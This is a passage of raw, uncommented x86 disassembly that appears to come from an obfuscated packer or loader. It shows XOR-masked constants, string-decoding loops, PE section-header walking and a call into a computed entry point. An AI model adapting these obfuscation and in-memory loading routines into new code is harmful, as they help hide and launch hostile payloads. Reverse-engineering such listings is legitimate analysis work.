  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
